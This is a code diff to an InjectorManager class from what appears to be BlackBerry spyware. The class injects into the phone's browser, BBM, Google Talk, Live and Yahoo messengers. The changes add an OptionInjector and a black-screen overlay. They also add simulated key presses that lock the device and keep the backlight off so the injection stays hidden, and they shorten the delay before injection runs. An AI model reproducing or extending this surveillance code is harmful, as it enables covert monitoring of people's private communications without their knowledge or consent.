@@ -12,6 +12,7 @@ import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.InjectionFrameworkApp;
 import blackberry.application.AppListener;
 import blackberry.application.ApplicationObserver;
 import blackberry.application.BacklightObserver;
@@ -24,6 +25,7 @@ import blackberry.injection.injectors.BBMInjector;
 import blackberry.injection.injectors.BrowserInjector;
 import blackberry.injection.injectors.GoogleTalkInjector;
 import blackberry.injection.injectors.LiveInjector;
+import blackberry.injection.injectors.OptionInjector;
 import blackberry.injection.injectors.YahooInjector;
 import blackberry.interfaces.Singleton;
 import blackberry.interfaces.iSingleton;
@@ -84,7 +86,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         appListener.suspendable(true);
         injectors = new AInjector[] { new BrowserInjector(), new BBMInjector(),
                 new GoogleTalkInjector(), new LiveInjector(),
-                new YahooInjector() };
+                new YahooInjector(), new OptionInjector() };
 
         if (!Backlight.isEnabled()) {
             injectAll();
@@ -157,7 +159,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         manager.requestForegroundForConsole();
         unLock();
 
-        if (execute(name)) {
+        if (injector.execute(name)) {
             //#ifdef DEBUG
             debug.trace("inject, executed: " + name);
             //#endif
@@ -195,11 +197,19 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
      */
     private void unLock() {
         //#ifdef DEBUG
-        debug.trace("unLock: " + ApplicationManager.getApplicationManager().isSystemLocked());
+        debug.trace("unLock: "
+                + ApplicationManager.getApplicationManager().isSystemLocked());
         //#endif
 
+        if (backlightEnabled()) {
+            return;
+        }
+
+        //show black screen        
+        InjectionFrameworkApp.getInstance().pushBlack();
+        Utils.sleep(300);
         KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
-        Utils.sleep(100);
+        Utils.sleep(300);
 
         if (backlightEnabled()) {
             //#ifdef DEBUG
@@ -209,12 +219,12 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
 
             KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
             setBacklight(false);
-            Utils.sleep(50);
+            Utils.sleep(100);
             KeyInjector.pressRawKeyCode(KEY_LOCK);
             setBacklight(false);
             Utils.sleep(100);
             setBacklight(false);
-            Utils.sleep(500);
+
             for (int i = 0; i < 10; i++) {
                 if (backlightEnabled()) {
                     //Backlight.enable(false);
@@ -227,10 +237,9 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                 }
             }
 
-            return;
         }
 
-        //Main.getInstance().showBlackScreen(false); 
+        InjectionFrameworkApp.getInstance().popBlack();
     }
 
     private boolean checkForeground(String codname) {
@@ -314,7 +323,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         injectorMap.clear();
     }
 
-    private boolean execute(String codName) {
+    protected boolean execute(String codName) {
         int foregroundPin = manager.getForegroundProcessId();
         ApplicationDescriptor[] apps = manager.getVisibleApplications();
         for (int i = 0; i < apps.length; i++) {
@@ -416,13 +425,14 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                     debug.trace("onApplicationChange: screen found");
                     //#endif
 
-                    UiApplication.getUiApplication().invokeAndWait(new Runnable() {
+                    UiApplication.getUiApplication().invokeAndWait(
+                            new Runnable() {
 
-                        public void run() {
-                            injector.playOnScreen(screen);
-                        }
+                                public void run() {
+                                    injector.playOnScreen(screen);
+                                }
 
-                    });
+                            });
 
                     break;
                 }
@@ -488,7 +498,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             applicationTimer = new Timer();
             RunInjectorTask task = new RunInjectorTask(RUNON_BACKLIGHT);
 
-            applicationTimer.schedule(task, 11000, Integer.MAX_VALUE);
+            applicationTimer.schedule(task, 1000, Integer.MAX_VALUE);
         }
     }
 
